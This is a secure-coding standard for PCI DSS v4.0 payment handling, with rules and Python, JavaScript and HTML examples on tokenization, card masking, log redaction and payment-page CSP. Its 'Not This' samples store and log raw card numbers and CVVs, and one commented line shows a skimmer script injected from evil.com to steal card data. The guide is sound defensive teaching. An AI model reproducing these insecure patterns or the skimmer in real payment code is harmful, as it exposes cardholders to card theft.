---
id: compliance-pci-dss
title: PCI DSS v4.0
scope: compliance
severity: critical
tags: [compliance, pci-dss, cardholder-data, tokenization, payment]
references:
  - title: "PCI DSS v4.0 — Payment Card Industry Data Security Standard"
    url: https://www.pcisecuritystandards.org/document_library/
  - title: "OWASP — Payment Processing Security Cheat Sheet"
    url: https://cheatsheetseries.owasp.org/cheatsheets/Payment_Processing_Cheat_Sheet.html
  - title: "CWE-312 — Cleartext Storage of Sensitive Information"
    url: https://cwe.mitre.org/data/definitions/312.html
  - title: "CWE-319 — Cleartext Transmission of Sensitive Information"
    url: https://cwe.mitre.org/data/definitions/319.html
---

## Principle

The safest cardholder data is data you never touch. Every line of code that handles raw card numbers expands your Cardholder Data Environment (CDE), increases audit scope, and creates breach risk. Use payment processor tokens so card data flows directly from the user's browser to the processor — never through your servers.

PCI DSS v4.0 imposes specific technical controls on any system that stores, processes, or transmits cardholder data. The most effective coding strategy is to minimize the CDE to near-zero by delegating card handling to PCI-compliant processors (Stripe, Braintree, Adyen). This standard covers the coding patterns that achieve that — and the rules for the cases where cardholder data must be handled.

## Rules

### Tokenization

1. **Never store full Primary Account Numbers (PANs).** Use a PCI-compliant payment processor's tokenization API. Card data should flow directly from the client-side SDK (Stripe Elements, Braintree Drop-in) to the processor. Your backend receives only a token ID — never the card number. Store token IDs, not card data. (PCI DSS Requirement 3.4, CWE-312)

2. **Never store CVV/CVC after authorization.** The card verification code must never be stored in any form — not encrypted, not hashed, not logged, not cached. Accept it in the client-side form, pass it to the processor for the authorization request, and ensure it never reaches your server. If your architecture routes CVV through your backend, redesign to use client-side tokenization. (PCI DSS Requirement 3.2)

3. **Validate that prohibited data never enters storage.** Add server-side validation that rejects any request body containing fields that look like card numbers (13-19 digit sequences passing Luhn check), CVVs (3-4 digit fields in payment contexts), or track data. This is a safety net — the architecture should prevent these from arriving, but validation catches misconfigurations.

### Card Data Masking

4. **Display only the last four digits of a card number.** In all UI displays, API responses, receipts, and confirmations, show card numbers as `**** **** **** 1234`. When the first six digits (BIN) are needed for business purposes (card network identification), show at most the first six and last four: `123456** **** 1234`. Never display the full PAN in any context. (PCI DSS Requirement 3.4)

5. **Mask card numbers in all log output.** Apply regex-based log filtering that detects and redacts sequences matching card number patterns before log entries are written. This supplements the architectural control (card data should not reach your servers) with a defense-in-depth filter. See the Patterns section for the specific regex.

### CDE Isolation

6. **Isolate payment processing code in a dedicated service boundary.** If your system must handle cardholder data (not just tokens), the code that touches card data must be in a separate service, module, or namespace with its own access controls. Non-CDE code must never import CDE modules. CDE services communicate only tokenized or masked data to non-CDE systems.

7. **Restrict network access to CDE components.** CDE services should run in isolated network segments (separate VPC subnets, Kubernetes namespaces with network policies). Ingress: only from the payment form frontend and the payment processor. Egress: only to the payment processor. All other traffic is denied by default.

### Encryption

8. **Encrypt all cardholder data in transit with TLS 1.2 or higher.** Every connection that transmits cardholder data must use TLS 1.2+ with strong cipher suites. TLS 1.0 and 1.1 are explicitly prohibited by PCI DSS v4.0. This applies to connections between your client and server, between your server and the payment processor, and between any internal services that handle card data. (PCI DSS Requirement 4.2, CWE-319)

9. **Encrypt stored cardholder data with AES-256.** If cardholder data must be stored (which it should not be — see rule 1), encrypt it with AES-256-GCM. Encryption keys must be stored separately from encrypted data, managed through a KMS or HSM, and rotated at least annually. PCI DSS requires PANs to be rendered unreadable wherever they are stored (Requirement 3.5.1) using strong cryptography, truncation, tokens, or one-way hashes. VCP recommends field-level encryption of PAN data because disk-level encryption (TDE) protects against physical theft but not against application-layer or database-admin access. (PCI DSS Requirement 3.5, CWE-312)

### Audit Trails

10. **Log all access to cardholder data with individual attribution.** Every read, write, or deletion of cardholder data must produce an audit log entry that includes: the authenticated user ID, the action performed, the timestamp, the source IP, and the resource accessed. Log entries must be tamper-evident (append-only storage or integrity hashing). (PCI DSS Requirement 10.2)

11. **Retain audit logs for at least 12 months, with 3 months immediately accessible.** Audit logs for cardholder data access must be retained for one year minimum. The most recent 3 months must be immediately available for analysis (not archived). Older logs may be in archival storage but must be retrievable. (PCI DSS Requirement 10.7)

### Authentication for CDE Access

12. **Require multi-factor authentication for all access to the CDE.** PCI DSS v4.0 expanded the MFA requirement to all personnel with access to the CDE — not just administrators. Any service account, admin panel, or API endpoint that accesses cardholder data must enforce MFA. (PCI DSS Requirement 8.4)

13. **Enforce minimum 12-character passwords for CDE systems.** PCI DSS v4.0 increased the minimum password length from 7 to 12 characters and requires both alphabetic and numeric characters. Implement this in account creation and password change flows for any system in the CDE. (PCI DSS Requirement 8.3.6)

### Payment Page Security

14. **Restrict payment page scripts with a Content Security Policy.** Payment pages must load only authorized scripts. Set a CSP header that allowlists only the payment processor's SDK (e.g., `js.stripe.com`) and your own verified scripts. Block inline scripts and any third-party script not explicitly required for payment processing. This prevents Magecart-style attacks where injected scripts skim card data from payment forms. (PCI DSS Requirement 6.4.3)

## Patterns

### Client-Side Tokenization

#### Do This

```javascript
// Stripe Elements — card data goes directly to Stripe, never to your server
import { loadStripe } from "@stripe/stripe-js";

const stripe = await loadStripe("pk_live_...");
const elements = stripe.elements();
const cardElement = elements.create("card");
cardElement.mount("#card-element");

async function handlePayment() {
  // Card data flows: browser → Stripe → token returned
  const { token, error } = await stripe.createToken(cardElement);
  if (error) {
    showError(error.message);
    return;
  }
  // Only the token ID reaches your server — never the card number
  await fetch("/api/payments", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ token_id: token.id, amount: 2999 }),
  });
}
```

```python
# Backend receives only the token — charges through Stripe API
import stripe

async def create_payment(token_id: str, amount: int) -> dict:
    charge = stripe.Charge.create(
        amount=amount,
        currency="usd",
        source=token_id,  # Token ID, not card number
        description="Order #1234",
    )
    # Store only: charge.id, charge.status, last4 from charge.payment_method_details
    return {"charge_id": charge.id, "status": charge.status}
```

#### Not This

```python
# Card number passes through your server — entire backend is now CDE (CWE-312)
@app.post("/api/payments")
async def create_payment(request: Request):
    data = await request.json()
    card_number = data["card_number"]   # Full PAN on your server
    cvv = data["cvv"]                    # CVV on your server — PCI violation
    expiry = data["expiry"]

    # Store card for later — never do this
    await db.execute(
        "INSERT INTO cards (user_id, card_number, cvv) VALUES ($1, $2, $3)",
        [user_id, card_number, cvv]
    )
```

**Why it's wrong:** The card number and CVV pass through your server, making your entire backend part of the CDE. Every server, database, log system, and network segment that this data touches is now in scope for PCI DSS auditing. The CVV is stored — an explicit PCI DSS violation regardless of encryption. Client-side tokenization eliminates all of this.

### Prohibited Data Validation

#### Do This

```python
import re

# Luhn check to detect potential card numbers
def passes_luhn(number: str) -> bool:
    digits = [int(d) for d in number]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    total = sum(odd_digits) + sum(sum(divmod(2 * d, 10)) for d in even_digits)
    return total % 10 == 0

CARD_PATTERN = re.compile(r"\b\d{13,19}\b")
PROHIBITED_FIELDS = {"card_number", "pan", "cvv", "cvc", "cvv2", "track1", "track2"}

def reject_prohibited_card_data(data: dict) -> None:
    """Safety net: reject requests that contain raw card data."""
    for key in data:
        if key.lower() in PROHIBITED_FIELDS:
            raise ValueError(f"Prohibited field: {key}. Use client-side tokenization.")

    # Check string values for card number patterns
    for key, value in data.items():
        if isinstance(value, str):
            matches = CARD_PATTERN.findall(value.replace(" ", "").replace("-", ""))
            for match in matches:
                if len(match) >= 13 and passes_luhn(match):
                    raise ValueError(f"Potential card number detected in field: {key}")
```

#### Not This

```python
# No validation — card data can arrive in any field and get stored
@app.post("/api/orders")
async def create_order(request: Request):
    data = await request.json()  # Could contain {"notes": "card 4111111111111111"}
    await db.execute("INSERT INTO orders (data) VALUES ($1)", [json.dumps(data)])
```

**Why it's wrong:** Without validation, card numbers can leak into non-CDE systems through freetext fields, notes, or misconfigured forms. A card number in an order notes field means the orders table is now in the CDE. The validation is a defense-in-depth measure — the architecture should prevent card data from arriving, but validation catches the cases where it does.

### Card Number Log Masking

#### Do This

```python
import re
import logging

CARD_REGEX = re.compile(r"\b(\d{4})[\s-]?(\d{4})[\s-]?(\d{4})[\s-]?(\d{4})\b")
CARD_LIKE = re.compile(r"\b\d{13,19}\b")

class CardMaskingFilter(logging.Filter):
    def filter(self, record: logging.LogRecord) -> bool:
        if isinstance(record.msg, str):
            record.msg = CARD_REGEX.sub(r"****-****-****-\4", record.msg)
            record.msg = CARD_LIKE.sub("[CARD_REDACTED]", record.msg)
        return True

logging.getLogger().addFilter(CardMaskingFilter())
```

#### Not This

```python
# Logging raw card data — PCI violation (CWE-532)
logger.info(f"Processing payment for card {card_number}")
logger.error(f"Payment failed for {card_number}, CVV: {cvv}")
```

**Why it's wrong:** Log systems store data for months or years across multiple infrastructure components (log aggregators, SIEM, backup storage). A card number in a log means every system that stores that log is now in the CDE. Log masking is a defense-in-depth measure — if the architecture is correct, card numbers should never reach your application logs in the first place.

### Payment Page CSP

#### Do This

```python
# Restrict payment page to authorized scripts only
@app.middleware("http")
async def csp_header(request: Request, call_next):
    response = await call_next(request)
    if request.url.path.startswith("/checkout"):
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; "
            "script-src 'self' https://js.stripe.com; "
            "frame-src https://js.stripe.com https://hooks.stripe.com; "
            "connect-src 'self' https://api.stripe.com; "
            "style-src 'self' 'unsafe-inline'"  # Stripe Elements requires inline styles
        )
    return response
```

#### Not This

```html
<!-- No CSP — any injected script can skim card data -->
<head>
  <script src="https://js.stripe.com/v3/"></script>
  <!-- Attacker injects: <script src="https://evil.com/skimmer.js"></script> -->
  <!-- Skimmer reads card data from Stripe Elements and sends to attacker -->
</head>
```

**Why it's wrong:** Without a CSP, any script injected into the payment page (via XSS, compromised CDN, or supply chain attack) can read the card data from form fields and exfiltrate it. This is the Magecart attack vector — responsible for breaches at British Airways, Ticketmaster, and thousands of e-commerce sites. CSP is a PCI DSS v4.0 requirement for payment pages.

## Exceptions

- **Processor-hosted payment pages** (Stripe Checkout, PayPal Hosted Fields) offload payment form rendering entirely to the processor. In this case, your application never handles card data and your CDE scope is minimal. Tokenization still applies for recurring payments.
- **Card-present (POS) systems** have different PCI requirements for point-to-point encryption (P2PE). This standard covers card-not-present (e-commerce) scenarios.
- **Recurring payments** may store processor tokens indefinitely (they are not cardholder data). Token management still requires access controls and audit logging, but not PAN-level encryption.

## Cross-References

- [Security](core-security) — Rule 5 (strong cryptographic algorithms), Rule 9 (encrypt sensitive data at rest and in transit)
- [Frontend Security](web-frontend-security) — CSP and XSS prevention for payment pages
- [Backend Security](web-backend-security) — Rate limiting on payment endpoints, secrets management for API keys
- [Database Encryption](database-encryption) — Key management for stored cardholder data encryption
